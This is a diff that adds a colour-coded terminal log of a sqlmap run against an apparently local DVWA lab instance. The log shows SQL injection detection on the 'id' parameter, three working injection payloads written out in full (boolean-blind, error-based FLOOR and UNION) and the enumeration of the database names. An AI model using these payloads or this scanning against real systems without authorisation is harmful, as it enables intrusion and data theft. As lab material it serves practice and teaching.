@@ -1,0 +1,120 @@
+[01;33m        ___
+       __H__
+ ___ ___[[01;41m"[01;49m]_____ ___ ___  [01;37m{[01;90m1.9.6#stable[01;37m}[01;33m
+|_ -| . [[01;41m([01;49m]     | .'| . |
+|___|_  [[01;41m"[01;49m]_|_|_|__,|  _|
+      |_|V...       |_|   [0m[4;37mhttps://sqlmap.org[0m
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 22:27:43 /2026-02-05/
+
+
+[[36m22:27:43[0m] [[32mINFO[0m] fetched random HTTP User-Agent header value '[37mMozilla/5.0 (Macintosh; U; PPC Mac OS X 10_5_8; en-us) AppleWebKit/532.0+ (KHTML, like Gecko) Version/4.0.3 Safari/531.9.2009[0m' from file '[37m/usr/share/sqlmap/data/txt/user-agents.txt[0m'
+
+[[36m22:27:44[0m] [[32mINFO[0m] flushing session file
+
+[[36m22:27:44[0m][1m [[32;1mINFO[0m][1m testing connection to the target URL[0m
+
+[[36m22:27:44[0m] [[32mINFO[0m] checking if the target is protected by some kind of WAF/IPS
+
+[[36m22:27:44[0m] [[32mINFO[0m] testing if the target URL content is stable
+
+[[36m22:27:44[0m] [[32mINFO[0m] target URL content is stable
+
+[[36m22:27:44[0m] [[32mINFO[0m] testing if GET parameter '[37mid[0m' is dynamic
+
+[[36m22:27:44[0m] [[33mWARNING[0m] GET parameter '[37mid[0m' does not appear to be dynamic
+
+[[36m22:27:44[0m][1m [[32;1mINFO[0m][1m heuristic (basic) test shows that GET parameter '[37mid[0m[1m' might be injectable (possible DBMS: '[37mMySQL[0m[1m')[0m
+
+[[36m22:27:44[0m][1m [[32;1mINFO[0m][1m heuristic (XSS) test shows that GET parameter '[37mid[0m[1m' might be vulnerable to cross-site scripting (XSS) attacks[0m
+
+[[36m22:27:44[0m] [[32mINFO[0m] testing for SQL injection on GET parameter '[37mid[0m'
+[1m
+it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+[0m[1m
+for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
+[0m
+[[36m22:27:44[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause[0m'
+
+[[36m22:27:44[0m] [[33mWARNING[0m] reflective value(s) found and filtering out
+
+[[36m22:27:44[0m] [[32mINFO[0m] testing '[37mBoolean-based blind - Parameter replace (original value)[0m'
+
+[[36m22:27:44[0m] [[32mINFO[0m] testing '[37mAND boolean-based blind - WHERE or HAVING clause (MySQL comment)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mOR boolean-based blind - WHERE or HAVING clause (MySQL comment)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mOR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)[0m'
+
+[[36m22:27:45[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' appears to be '[37mOR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)[0m[1m' injectable (with --not-string="Me")[0m
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)[0m'
+
+[[36m22:27:45[0m] [[32mINFO[0m] testing '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m'
+
+[[36m22:27:46[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' is '[37mMySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)[0m[1m' injectable [0m
+
+[[36m22:27:46[0m] [[32mINFO[0m] testing '[37mGeneric UNION query (NULL) - 1 to 20 columns[0m'
+
+[[36m22:27:46[0m] [[32mINFO[0m] testing '[37mMySQL UNION query (NULL) - 1 to 20 columns[0m'
+
+[[36m22:27:46[0m] [[32mINFO[0m] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
+
+[[36m22:27:46[0m] [[32mINFO[0m] '[37mORDER BY[0m' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+
+[[36m22:27:46[0m] [[32mINFO[0m] target URL appears to have 2 columns in query
+
+[[36m22:27:46[0m][1m [[32;1mINFO[0m][1m GET parameter '[37mid[0m[1m' is '[37mMySQL UNION query (NULL) - 1 to 20 columns[0m[1m' injectable[0m
+
+[[36m22:27:46[0m] [[33mWARNING[0m] in OR boolean-based injection cases, please consider usage of switch '[37m--drop-set-cookie[0m' if you experience any problems during data retrieval
+[1m
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+[0msqlmap identified the following injection point(s) with a total of 143 HTTP(s) requests:
+---
+Parameter: id (GET)
+    Type: boolean-based blind
+    Title: OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)
+    Payload: id=1' OR NOT 6856=6856#&Submit=Submit
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
+    Payload: id=1' AND (SELECT 2316 FROM(SELECT COUNT(*),CONCAT(0x7170767871,(SELECT (ELT(2316=2316,1))),0x716a6a7671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- Lcvs&Submit=Submit
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 2 columns
+    Payload: id=1' UNION ALL SELECT NULL,CONCAT(0x7170767871,0x43706554415241464849796f5a4f625748767642524148586c6f686c424c41667446696950415a62,0x716a6a7671)#&Submit=Submit
+---
+
+[[36m22:27:46[0m][1m [[32;1mINFO[0m][1m the back-end DBMS is MySQL[0m
+web server operating system: Linux Debian 9 (stretch)
+web application technology: Apache 2.4.25
+back-end DBMS: MySQL >= 5.0 ([37mMariaDB [0mfork)
+
+[[36m22:27:46[0m] [[32mINFO[0m] fetching database names
+available databases [2]:
+[*] dvwa
+[*] information_schema
+
+
+[[36m22:27:46[0m] [[32mINFO[0m] fetched data logged to text files under '[37m/root/.local/share/sqlmap/output/host.docker.internal[0m'
+
+[[36m22:27:46[0m] [[33mWARNING[0m] your sqlmap version is outdated
+
+[*] ending @ 22:27:46 /2026-02-05/
+
